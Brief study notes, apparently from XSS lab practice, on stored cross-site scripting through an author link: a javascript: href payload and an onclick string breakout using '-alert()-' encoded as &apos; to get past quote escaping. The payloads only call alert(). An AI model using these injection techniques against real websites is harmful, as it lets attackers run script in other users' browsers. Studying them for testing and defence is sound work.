# stored examples

## alternate content href

in case of input convert the

- `<` -> `&lt;`
- `>` -> `&gt;`

try to make href accept the exploit:

`<a id="author" href="javascript:alert()">qwe</a>`

## trigger exploit onclick

in a blog an anchor tag stores url:

```
<a id="author" href="http://duck.com" onclick="var tracker={track(){}};tracker.track('http://duck.com');">duck</a>
```

with `'-alert()-'` exploit

```
<a id="author" href="http://duck.com?\'-alert()-\'" onclick="var tracker={track(){}};tracker.track('http://duck.com?\'-alert()-\'');">duck</a>
```

- browser try to escape the `'`, lets use `&apos;` -> `&apos;-alert()-&apos;`

```
<a id="author" href="http://duck.com'-alert()-'" onclick="var tracker={track(){}};tracker.track('http://duck.com'-alert()-'');">duck</a>
```
